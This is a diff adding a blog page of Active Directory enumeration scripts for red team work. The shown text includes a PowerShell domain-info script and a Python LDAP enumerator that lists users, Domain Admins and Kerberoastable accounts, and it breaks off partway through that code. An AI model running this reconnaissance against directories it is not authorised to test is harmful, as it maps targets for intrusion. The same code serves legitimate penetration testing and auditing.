@@ -1,0 +1,1213 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.26.2 by Michael Rose
+  Copyright 2013-2024 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+
+<html lang="en-US" class="no-js">
+  <head>
+    <meta charset="utf-8">
+<!-- begin _includes/seo.html --><title>AD Enumeration Toolkit: Scripts I Actually Use - Dcodezero</title>
+<meta name="description" content="PowerShell and Python scripts for Active Directory enumeration. LDAP queries, BloodHound collection, and quick-win one-liners.">
+
+
+  <meta name="author" content="Dcodezero">
+  
+  <meta property="article:author" content="Dcodezero">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Dcodezero">
+<meta property="og:title" content="AD Enumeration Toolkit: Scripts I Actually Use">
+<meta property="og:url" content="https://dcodezero.github.io//https://dcodezero.github.io/tools/red-team/ad-enumeration-toolkit/">
+
+
+  <meta property="og:description" content="PowerShell and Python scripts for Active Directory enumeration. LDAP queries, BloodHound collection, and quick-win one-liners.">
+
+
+
+  <meta property="og:image" content="https://dcodezero.github.io//https://dcodezero.github.io/assets/images/tools-scripts.svg">
+
+
+
+  <meta name="twitter:site" content="@Dcodezero">
+  <meta name="twitter:title" content="AD Enumeration Toolkit: Scripts I Actually Use">
+  <meta name="twitter:description" content="PowerShell and Python scripts for Active Directory enumeration. LDAP queries, BloodHound collection, and quick-win one-liners.">
+  <meta name="twitter:url" content="https://dcodezero.github.io//https://dcodezero.github.io/tools/red-team/ad-enumeration-toolkit/">
+
+  
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://dcodezero.github.io//https://dcodezero.github.io/assets/images/tools-scripts.svg">
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2026-01-06T00:00:00+00:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://dcodezero.github.io//https://dcodezero.github.io/tools/red-team/ad-enumeration-toolkit/">
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/https://dcodezero.github.io/feed.xml" type="application/atom+xml" rel="alternate" title="Dcodezero Feed">
+
+
+<!-- Add Mermaid with Debug -->
+<script src="https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js"></script>
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    mermaid.initialize({
+        startOnLoad: true,
+        securityLevel: 'loose',
+        logLevel: 'debug',
+        mindmap: {
+            padding: 20,
+            nodeSpacing: 60,
+            rankSpacing: 80
+        }
+    });
+
+    // Add error handling
+    mermaid.parseError = function(err, hash) {
+        console.error('Mermaid error:', err);
+        // Add visible error message
+        document.querySelectorAll('.mermaid').forEach(function(elem) {
+            elem.innerHTML += '<div style="color: red; background: #ffebee; padding: 10px; margin-top: 10px; border: 1px solid #ffcdd2;">Diagram Error: ' + err + '</div>';
+        });
+    };
+});
+</script><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script>
+document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+ 
+</script>
+<!-- For all browsers -->
+<link rel="stylesheet" href="/https://dcodezero.github.io/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css"></noscript>
+
+    <script id="mcjs">!function(c,h,i,m,p){m=c.createElement(h),p=c.getElementsByTagName(h)[0],m.async=1,m.src=i,p.parentNode.insertBefore(m,p)}(document,"script","https://chimpstatic.com/mcjs-connected/js/users/a236ffe3231543dfa1a53e2a4/b8e03e16b2df243b196811790.js");</script>
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single" dir="ltr">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/https://dcodezero.github.io/">
+          Dcodezero
+          <span class="site-subtitle">Dcodezero</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a
+                href="/https://dcodezero.github.io/about/"
+                
+                
+              >About</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/https://dcodezero.github.io/categories/"
+                
+                
+              >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/https://dcodezero.github.io/tags"
+                
+                
+              >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/https://dcodezero.github.io/it-posts/"
+                
+                
+              >I.T</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/https://dcodezero.github.io/tools/"
+                
+                
+              >Tools</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), url('/https://dcodezero.github.io/assets/images/tools-scripts.svg');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          AD Enumeration Toolkit: Scripts I Actually Use
+
+        
+      </h1>
+      
+        <p class="page__lead">PowerShell and Python scripts for Active Directory enumeration. LDAP queries, BloodHound collection, and quick-win one-liners.
+</p>
+      
+      
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+  </p>
+
+
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="/https://dcodezero.github.io/" itemprop="url">Dcodezero</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>I am an <strong>amazing</strong> person.</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Somewhere</span>
+        </li>
+      
+
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="AD Enumeration Toolkit: Scripts I Actually Use">
+    <meta itemprop="description" content="PowerShell and Python scripts for Active Directory enumeration. LDAP queries, BloodHound collection, and quick-win one-liners.">
+    <meta itemprop="datePublished" content="2026-01-06T00:00:00+00:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu"><li><a href="#initial-domain-enumeration">Initial Domain Enumeration</a><ul><li><a href="#quick-domain-info-powershell">Quick Domain Info (PowerShell)</a></li><li><a href="#ldap-enumeration-without-ad-module-python">LDAP Enumeration Without AD Module (Python)</a></li></ul></li><li><a href="#bloodhound-collection-without-sharphound">BloodHound Collection Without SharpHound</a></li><li><a href="#quick-wins-one-liners">Quick Wins One-Liners</a><ul><li><a href="#find-users-with-passwords-in-description">Find Users with Passwords in Description</a></li><li><a href="#find-computers-with-unconstrained-delegation">Find Computers with Unconstrained Delegation</a></li><li><a href="#gpo-enumeration-for-quick-wins">GPO Enumeration for Quick Wins</a></li></ul></li><li><a href="#wrapping-it-up-enum-automation-script">Wrapping It Up: Enum Automation Script</a></li><li><a href="#usage">Usage</a></li></ul>
+            </nav>
+          </aside>
+        
+        <p>Every red team engagement against Active Directory starts the same way: enumeration. Before you can exploit anything, you need to understand the environment. These are the scripts and one-liners I’ve built up over time that I actually use on engagements.</p>
+
+<p>No fluff. Just working code.</p>
+
+<h2 id="initial-domain-enumeration">Initial Domain Enumeration</h2>
+
+<p>First things first - basic domain information. This wrapper script pulls essential info quickly.</p>
+
+<h3 id="quick-domain-info-powershell">Quick Domain Info (PowerShell)</h3>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ad-quickenum.ps1</span><span class="w">
+</span><span class="c"># Fast domain enumeration - run from domain-joined or with runas</span><span class="w">
+
+</span><span class="kr">function</span><span class="w"> </span><span class="nf">Get-DomainQuickInfo</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="kr">param</span><span class="p">(</span><span class="w">
+        </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$Domain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERDNSDOMAIN</span><span class="w">
+    </span><span class="p">)</span><span class="w">
+
+    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[*] Enumerating: </span><span class="nv">$Domain</span><span class="s2">"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Cyan</span><span class="w">
+
+    </span><span class="c"># Domain Controllers</span><span class="w">
+    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">[+] Domain Controllers:"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Green</span><span class="w">
+    </span><span class="nv">$dcs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.DirectoryServices.ActiveDirectory.Domain</span><span class="p">]::</span><span class="n">GetCurrentDomain</span><span class="p">()</span><span class="o">.</span><span class="nf">DomainControllers</span><span class="w">
+    </span><span class="nv">$dcs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"    </span><span class="si">$(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="si">)</span><span class="s2"> - </span><span class="si">$(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IPAddress</span><span class="si">)</span><span class="s2">"</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+
+    </span><span class="c"># Forest info</span><span class="w">
+    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">[+] Forest Information:"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Green</span><span class="w">
+    </span><span class="nv">$forest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.DirectoryServices.ActiveDirectory.Forest</span><span class="p">]::</span><span class="n">GetCurrentForest</span><span class="p">()</span><span class="w">
+    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"    Forest: </span><span class="si">$(</span><span class="nv">$forest</span><span class="o">.</span><span class="nf">Name</span><span class="si">)</span><span class="s2">"</span><span class="w">
+    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"    Forest Mode: </span><span class="si">$(</span><span class="nv">$forest</span><span class="o">.</span><span class="nf">ForestMode</span><span class="si">)</span><span class="s2">"</span><span class="w">
+    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"    Domains in Forest: </span><span class="si">$(</span><span class="nv">$forest</span><span class="o">.</span><span class="nf">Domains</span><span class="o">.</span><span class="nf">Count</span><span class="si">)</span><span class="s2">"</span><span class="w">
+
+    </span><span class="c"># Trust relationships</span><span class="w">
+    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">[+] Domain Trusts:"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Green</span><span class="w">
+    </span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nv">$trusts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">System.DirectoryServices.ActiveDirectory.Domain</span><span class="p">]::</span><span class="n">GetCurrentDomain</span><span class="p">())</span><span class="o">.</span><span class="nf">GetAllTrustRelationships</span><span class="p">()</span><span class="w">
+        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$trusts</span><span class="o">.</span><span class="nf">Count</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+            </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"    No trusts found"</span><span class="w">
+        </span><span class="p">}</span><span class="w"> </span><span class="kr">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+            </span><span class="nv">$trusts</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
+                </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"    </span><span class="si">$(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">TargetName</span><span class="si">)</span><span class="s2"> - </span><span class="si">$(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">TrustDirection</span><span class="si">)</span><span class="s2"> - </span><span class="si">$(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">TrustType</span><span class="si">)</span><span class="s2">"</span><span class="w">
+            </span><span class="p">}</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">}</span><span class="w"> </span><span class="kr">catch</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"    Unable to enumerate trusts"</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+
+    </span><span class="c"># Password policy</span><span class="w">
+    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">[+] Password Policy:"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Green</span><span class="w">
+    </span><span class="nv">$policy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ADDefaultDomainPasswordPolicy</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
+    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$policy</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"    Min Length: </span><span class="si">$(</span><span class="nv">$policy</span><span class="o">.</span><span class="nf">MinPasswordLength</span><span class="si">)</span><span class="s2">"</span><span class="w">
+        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"    Lockout Threshold: </span><span class="si">$(</span><span class="nv">$policy</span><span class="o">.</span><span class="nf">LockoutThreshold</span><span class="si">)</span><span class="s2">"</span><span class="w">
+        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"    Lockout Duration: </span><span class="si">$(</span><span class="nv">$policy</span><span class="o">.</span><span class="nf">LockoutDuration</span><span class="si">)</span><span class="s2">"</span><span class="w">
+        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"    Password History: </span><span class="si">$(</span><span class="nv">$policy</span><span class="o">.</span><span class="nf">PasswordHistoryCount</span><span class="si">)</span><span class="s2">"</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span><span class="n">Get-DomainQuickInfo</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="ldap-enumeration-without-ad-module-python">LDAP Enumeration Without AD Module (Python)</h3>
+
+<p>When you can’t use PowerShell AD modules, LDAP queries work. This script requires network access to a DC.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="s">"""
+ad_enum.py - LDAP-based AD enumeration
+Works without domain-joined machine, just needs creds and DC access
+"""</span>
+
+<span class="kn">import</span> <span class="nn">ldap3</span>
+<span class="kn">from</span> <span class="nn">ldap3</span> <span class="kn">import</span> <span class="n">Server</span><span class="p">,</span> <span class="n">Connection</span><span class="p">,</span> <span class="n">ALL</span><span class="p">,</span> <span class="n">NTLM</span><span class="p">,</span> <span class="n">SUBTREE</span>
+<span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="k">class</span> <span class="nc">ADEnumerator</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">dc_ip</span><span class="p">,</span> <span class="n">domain</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">dc_ip</span> <span class="o">=</span> <span class="n">dc_ip</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">domain</span> <span class="o">=</span> <span class="n">domain</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">username</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">password</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">conn</span> <span class="o">=</span> <span class="bp">None</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">base_dn</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">_domain_to_dn</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">_domain_to_dn</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">domain</span><span class="p">):</span>
+        <span class="s">"""Convert domain.local to DC=domain,DC=local"""</span>
+        <span class="k">return</span> <span class="s">','</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s">'DC=</span><span class="si">{</span><span class="n">part</span><span class="si">}</span><span class="s">'</span> <span class="k">for</span> <span class="n">part</span> <span class="ow">in</span> <span class="n">domain</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)])</span>
+
+    <span class="k">def</span> <span class="nf">connect</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="s">"""Establish LDAP connection"""</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">server</span> <span class="o">=</span> <span class="n">Server</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">dc_ip</span><span class="p">,</span> <span class="n">get_info</span><span class="o">=</span><span class="n">ALL</span><span class="p">)</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">conn</span> <span class="o">=</span> <span class="n">Connection</span><span class="p">(</span>
+                <span class="n">server</span><span class="p">,</span>
+                <span class="n">user</span><span class="o">=</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">domain</span><span class="si">}</span><span class="se">\\</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">username</span><span class="si">}</span><span class="s">'</span><span class="p">,</span>
+                <span class="n">password</span><span class="o">=</span><span class="bp">self</span><span class="p">.</span><span class="n">password</span><span class="p">,</span>
+                <span class="n">authentication</span><span class="o">=</span><span class="n">NTLM</span><span class="p">,</span>
+                <span class="n">auto_bind</span><span class="o">=</span><span class="bp">True</span>
+            <span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Connected to </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">dc_ip</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+            <span class="k">return</span> <span class="bp">True</span>
+        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[-] Connection failed: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+            <span class="k">return</span> <span class="bp">False</span>
+
+    <span class="k">def</span> <span class="nf">get_users</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">enabled_only</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
+        <span class="s">"""Enumerate domain users"""</span>
+        <span class="k">if</span> <span class="n">enabled_only</span><span class="p">:</span>
+            <span class="c1"># Filter for enabled accounts only
+</span>            <span class="n">search_filter</span> <span class="o">=</span> <span class="s">'(&amp;(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">search_filter</span> <span class="o">=</span> <span class="s">'(&amp;(objectClass=user)(objectCategory=person))'</span>
+
+        <span class="bp">self</span><span class="p">.</span><span class="n">conn</span><span class="p">.</span><span class="n">search</span><span class="p">(</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">base_dn</span><span class="p">,</span>
+            <span class="n">search_filter</span><span class="p">,</span>
+            <span class="n">search_scope</span><span class="o">=</span><span class="n">SUBTREE</span><span class="p">,</span>
+            <span class="n">attributes</span><span class="o">=</span><span class="p">[</span><span class="s">'sAMAccountName'</span><span class="p">,</span> <span class="s">'description'</span><span class="p">,</span> <span class="s">'memberOf'</span><span class="p">,</span> <span class="s">'pwdLastSet'</span><span class="p">,</span> <span class="s">'lastLogon'</span><span class="p">]</span>
+        <span class="p">)</span>
+
+        <span class="n">users</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="k">for</span> <span class="n">entry</span> <span class="ow">in</span> <span class="bp">self</span><span class="p">.</span><span class="n">conn</span><span class="p">.</span><span class="n">entries</span><span class="p">:</span>
+            <span class="n">users</span><span class="p">.</span><span class="n">append</span><span class="p">({</span>
+                <span class="s">'username'</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">entry</span><span class="p">.</span><span class="n">sAMAccountName</span><span class="p">),</span>
+                <span class="s">'description'</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">entry</span><span class="p">.</span><span class="n">description</span><span class="p">)</span> <span class="k">if</span> <span class="n">entry</span><span class="p">.</span><span class="n">description</span> <span class="k">else</span> <span class="s">''</span><span class="p">,</span>
+                <span class="s">'groups'</span><span class="p">:</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">g</span><span class="p">)</span> <span class="k">for</span> <span class="n">g</span> <span class="ow">in</span> <span class="n">entry</span><span class="p">.</span><span class="n">memberOf</span><span class="p">]</span> <span class="k">if</span> <span class="n">entry</span><span class="p">.</span><span class="n">memberOf</span> <span class="k">else</span> <span class="p">[]</span>
+            <span class="p">})</span>
+
+        <span class="k">return</span> <span class="n">users</span>
+
+    <span class="k">def</span> <span class="nf">get_computers</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="s">"""Enumerate domain computers"""</span>
+        <span class="n">search_filter</span> <span class="o">=</span> <span class="s">'(objectClass=computer)'</span>
+
+        <span class="bp">self</span><span class="p">.</span><span class="n">conn</span><span class="p">.</span><span class="n">search</span><span class="p">(</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">base_dn</span><span class="p">,</span>
+            <span class="n">search_filter</span><span class="p">,</span>
+            <span class="n">search_scope</span><span class="o">=</span><span class="n">SUBTREE</span><span class="p">,</span>
+            <span class="n">attributes</span><span class="o">=</span><span class="p">[</span><span class="s">'name'</span><span class="p">,</span> <span class="s">'operatingSystem'</span><span class="p">,</span> <span class="s">'operatingSystemVersion'</span><span class="p">,</span> <span class="s">'dNSHostName'</span><span class="p">]</span>
+        <span class="p">)</span>
+
+        <span class="n">computers</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="k">for</span> <span class="n">entry</span> <span class="ow">in</span> <span class="bp">self</span><span class="p">.</span><span class="n">conn</span><span class="p">.</span><span class="n">entries</span><span class="p">:</span>
+            <span class="n">computers</span><span class="p">.</span><span class="n">append</span><span class="p">({</span>
+                <span class="s">'name'</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">entry</span><span class="p">.</span><span class="n">name</span><span class="p">),</span>
+                <span class="s">'os'</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">entry</span><span class="p">.</span><span class="n">operatingSystem</span><span class="p">)</span> <span class="k">if</span> <span class="n">entry</span><span class="p">.</span><span class="n">operatingSystem</span> <span class="k">else</span> <span class="s">'Unknown'</span><span class="p">,</span>
+                <span class="s">'dns'</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">entry</span><span class="p">.</span><span class="n">dNSHostName</span><span class="p">)</span> <span class="k">if</span> <span class="n">entry</span><span class="p">.</span><span class="n">dNSHostName</span> <span class="k">else</span> <span class="s">''</span>
+            <span class="p">})</span>
+
+        <span class="k">return</span> <span class="n">computers</span>
+
+    <span class="k">def</span> <span class="nf">get_domain_admins</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="s">"""Get Domain Admins group members"""</span>
+        <span class="n">search_filter</span> <span class="o">=</span> <span class="s">'(&amp;(objectClass=group)(cn=Domain Admins))'</span>
+
+        <span class="bp">self</span><span class="p">.</span><span class="n">conn</span><span class="p">.</span><span class="n">search</span><span class="p">(</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">base_dn</span><span class="p">,</span>
+            <span class="n">search_filter</span><span class="p">,</span>
+            <span class="n">search_scope</span><span class="o">=</span><span class="n">SUBTREE</span><span class="p">,</span>
+            <span class="n">attributes</span><span class="o">=</span><span class="p">[</span><span class="s">'member'</span><span class="p">]</span>
+        <span class="p">)</span>
+
+        <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">conn</span><span class="p">.</span><span class="n">entries</span><span class="p">:</span>
+            <span class="n">members</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">conn</span><span class="p">.</span><span class="n">entries</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">member</span> <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">conn</span><span class="p">.</span><span class="n">entries</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">member</span> <span class="k">else</span> <span class="p">[]</span>
+            <span class="k">return</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">m</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">','</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">replace</span><span class="p">(</span><span class="s">'CN='</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span> <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">members</span><span class="p">]</span>
+        <span class="k">return</span> <span class="p">[]</span>
+
+    <span class="k">def</span> <span class="nf">find_spn_accounts</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="s">"""Find accounts with SPNs set (Kerberoastable)"""</span>
+        <span class="n">search_filter</span> <span class="o">=</span> <span class="s">'(&amp;(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))'</span>
+
+        <span class="bp">self</span><span class="p">.</span><span class="n">conn</span><span class="p">.</span><span class="n">search</span><span class="p">(</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">base_dn</span><span class="p">,</span>
+            <span class="n">search_filter</span><span class="p">,</span>
+            <span class="n">search_scope</span><span class="o">=</span><span class="n">SUBTREE</span><span class="p">,</span>
+            <span class="n">attributes</span><span class="o">=</span><span class="p">[</span><span class="s">'sAMAccountName'</span><span class="p">,</span> <span class="s">'servicePrincipalName'</span><span class="p">,</span> <span class="s">'memberOf'</span><span class="p">]</span>
+        <span class="p">)</span>
+
+        <span class="n">spn_accounts</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="k">for</span> <span class="n">entry</span> <span class="ow">in</span> <span class="bp">self</span><span class="p">.</span><span class="n">conn</span><span class="p">.</span><span class="n">entries</span><span class="p">:</span>
+            <span class="n">spn_accounts</span><span class="p">.</span><span class="n">append</span><span class="p">({</span>
+                <span class="s">'username'</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">entry</span><span class="p">.</span><span class="n">sAMAccountName</span><span class="p">),</span>
